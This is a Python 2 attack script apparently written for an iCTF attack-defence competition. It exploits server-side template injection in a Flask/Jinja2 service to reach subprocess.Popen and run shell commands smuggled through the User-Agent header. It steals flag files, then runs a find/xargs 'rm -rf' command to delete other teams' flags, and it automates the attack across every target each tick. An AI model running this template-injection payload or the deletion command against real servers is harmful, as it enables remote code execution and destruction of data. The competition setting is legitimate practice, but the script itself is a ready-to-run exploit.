#!/usr/bin/env python

import os
import urllib
import time
import re

import requests

import ictf

popen_str = '{{config.__class__.__mro__[-1].__subclasses__()[%d](request.user_agent.string, shell=True, stdout=-1).stdout.read()}}'
catflag = 'cat ../append/flags/%s'
rm = 'find ../append/flags/ ! -name \'%s\' -print0 | xargs -0 -n 1 rm -rf'

urls = ('/see_unicorn', '/catch_unicorn', '/nice_try')

# Determines what the position of subprocess.Popen in object.__subclasses__() is
def get_subclass_num(host, port):
    payload = '{{config.__class__.__mro__[-1].__subclasses__()}}'
    for url in urls:
        r = requests.get('http://%s:%d%s' % (host, port, url), params={'next': payload})
        types = re.search(r'\[.*?\]', r.text)
        if not types:
            continue
        for i, line in enumerate(types.group(0).split(',')):
            if 'Popen' in line:
                return i

def catunicorns(flag_id, host, port):
    popen_subclass_num = get_subclass_num(host, port)
    if popen_subclass_num is None:
        return

    # Create popen string based on correct object.__subclass__()[i]
    actuall_popen = popen_str % popen_subclass_num

    for url in urls:
        try:
            r = requests.get('http://%s:%d%s' % (host, port, url),
                             params={'next': actuall_popen}, headers={'User-Agent': catflag % flag_id})
            flag = re.search('"flag": "([a-zA-Z_]+?)"', r.text)
            if not flag:
                continue

            # Let's wipe out all the files so other teams can't get flags, but be extra sure this doesn't
            # prevent us from catching the flag we already got
            try:
                requests.get('http://%s:%d%s' % (host, port, url),
                             params={'next': actuall_popen}, headers={'User-Agent': rm % flag_id})
            except:
                pass

            return flag.group(1)
        except:
            pass


print 'Logging on...',
t = ictf.iCTF().login(os.environ['USER'], os.environ['PASS'])
print 'Done'

while True:
    while t.get_tick_info()['approximate_seconds_left'] < 5:
        time.sleep(0.01)

    print 'Getting targets... ',
    targets = t.get_targets(10009)['targets']
    print 'got %s' % len(targets)

    flags_found = 0
    for targ in targets:
        if t.get_tick_info()['approximate_seconds_left'] < 5:
            break

        flag = catunicorns(targ['flag_id'], targ['hostname'], targ['port'])
        if flag:
            flags_found += 1
            print '{}: {}'.format(targ['flag_id'], flag)
            t.submit_flag(flag)
    print 'Found %d flags' % flags_found

    # Save those precious 2 cores we have!
    wait = max(t.get_tick_info()['approximate_seconds_left'] - 5, 0)
    if wait < 2:
        wait = 0
    print 'Waiting approx %d seconds until next tick' % wait
    time.sleep(wait)
